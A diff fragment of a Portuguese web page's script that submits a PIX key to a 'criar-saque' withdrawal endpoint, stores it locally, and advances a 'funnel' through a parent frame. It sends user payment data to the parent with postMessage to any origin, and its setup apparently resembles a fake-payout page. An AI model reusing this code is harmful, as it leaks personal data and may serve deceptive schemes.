+            // === FIM TIKTOK ENHANCED MATCH ===
+
+            fetch('/veriify/api/criar-saque.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.json())
+            .then(async data => {
+                // TRATAMENTO DE CHAVE JÁ VALIDADA (backend) - PERMITE PROSSEGUIR
+                if (data.already_validated) {
+                    console.log('INFO: Chave PIX já validada anteriormente - Permitindo prosseguir no funil');
+                    // NÃO BLOQUEIA MAIS - Continua o fluxo normal
+                }
+                
+                if (data.success) {
+                    // Salva cookie de validação bem-sucedida
+                    await savePixValidatedCookie(chavePix);
+                    
+                    // Armazena dados temporariamente
+                    storedFormData = formData;
+                    storedPaymentData = data.payment_info;
+
+                    // Backup no localStorage
+                    try {
+                        localStorage.setItem("userPixData", JSON.stringify(formData));
+                    } catch (e) {
+                        console.error("Erro ao salvar no localStorage", e);
+                    }
+
+                    // Transição para a etapa de confirmação
+                    setTimeout(() => {
+                        successOverlay.style.display = 'none';
+                        mainStep.style.display = 'none';
+                        confirmationStep.style.display = 'flex';
+                    }, 1000);
+
+                } else {
+                    alert('Erro ao processar saque: ' + (data.error || 'Erro desconhecido'));
+                    btnEnviar.classList.remove('btn-disabled');
+                    btnEnviar.innerHTML = '<span class="btn-text">Validar Dados</span>';
+                    successOverlay.style.display = 'none';
+                }
+            })
+            .catch(err => {
+                console.error('Erro:', err);
+                alert('Erro de conexão. Tente novamente.');
+                btnEnviar.classList.remove('btn-disabled');
+                btnEnviar.innerHTML = '<span class="btn-text">Validar Dados</span>';
+                successOverlay.style.display = 'none';
+            });
+        });
+
+        // Listener para o botão de confirmação do PIX recebido
+        let pixConfirmClicked = false; // Flag para evitar múltiplos cliques
+        
+        if (btnConfirmPix) {
+            btnConfirmPix.addEventListener('click', function(e) {
+                console.log("Botão 'Já Recebi o PIX' clicado!");
+                
+                // Previne múltiplos cliques
+                if (pixConfirmClicked) {
+                    console.log("Clique duplicado ignorado");
+                    return;
+                }
+                pixConfirmClicked = true;
+                
+                console.log("Dados armazenados:", storedFormData, storedPaymentData);
+                
+                // Desabilita o botão visualmente
+                btnConfirmPix.disabled = true;
+                btnConfirmPix.style.opacity = '0.6';
+                btnConfirmPix.style.cursor = 'not-allowed';
+
+                // Redireciona diretamente para a próxima página (sem disparar novo saque)
+                const message = {
+                    type: 'PIX_CONFIRMED',
+                    data: storedFormData,
+                    payment_info: storedPaymentData
+                };
+                
+                console.log("Enviando mensagem PIX_CONFIRMED:", message);
+                console.log("window.parent existe?", window.parent);
+                console.log("É iframe?", window.parent !== window);
+                
+                // Tenta múltiplas formas de enviar a mensagem
+                let messageSent = false;
+                
+                // Método 1: postMessage com origem específica
+                if (window.parent && window.parent !== window) {
+                    try {
+                        window.parent.postMessage(message, '*');
+                        console.log("✓ Mensagem enviada via postMessage(*)");
+                        messageSent = true;
+                    } catch(e) {
+                        console.error("Erro ao enviar postMessage:", e);
+                    }
+                    
+                    // Método 2: Tenta com origem do parent
+                    try {
+                        const parentOrigin = window.location.origin;
+                        window.parent.postMessage(message, parentOrigin);
+                        console.log("✓ Mensagem enviada com origem:", parentOrigin);
+                    } catch(e) {
+                        console.error("Erro ao enviar com origem específica:", e);
+                    }
+                    
+                    // Método 3: Fallback imediato - tenta acessar diretamente o parent
+                    setTimeout(function() {
+                        console.log("Executando fallback de redirecionamento...");
+                        try {
+                            if (typeof window.parent.showScreen === "function") {
+                                console.log("Chamando window.parent.showScreen('seven')");
+                                window.parent.showScreen('seven');
+                            } else if (window.parent.location) {
+                                console.log("Alterando window.parent.location.hash = '#seven'");
+                                window.parent.location.hash = '#seven';
+                            }
+                        } catch(e) {
+                            console.error("Erro no fallback:", e);
+                            // Último recurso: força reload na página pai
+                            try {
+                                window.top.location.hash = '#seven';
+                            } catch(e2) {
+                                console.error("Erro no fallback final:", e2);
+                            }
+                        }
+                    }, 300);
+                } else {
+                    console.log("Não está em iframe, redirecionando diretamente...");
+                    if (typeof window.showScreen === "function") {
+                        window.showScreen('seven');
+                    } else {
+                        location.hash = '#seven';
+                    }
+                }
+            });
+        }
+    </script>
+
+</body></html>
